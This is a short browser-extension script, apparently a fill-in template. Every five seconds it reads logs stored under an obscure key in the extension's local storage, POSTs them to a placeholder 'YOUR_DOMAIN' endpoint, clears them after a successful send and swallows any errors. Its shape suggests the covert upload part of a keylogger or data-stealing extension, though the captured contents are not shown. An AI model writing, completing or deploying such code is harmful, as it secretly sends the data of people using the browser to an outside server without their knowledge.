function sendLogs() {
 //chaches local storage
  chrome.storage.local.get("d", (res) => {
    const logs = res.d || [];
    if (logs.length === 0) return;

    const payload = {
      ts: Date.now(),
      logs: logs
    };
     // ADD YOUR DOMAIN HERE
    fetch("YOUR_DOMAIN", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    }).then(() => {
      chrome.storage.local.set({ d: [] }); // clear logs on success
    }).catch((err) => {
      // silently fail — retry on next interval
    });
  });
}

setInterval(sendLogs, 5000);
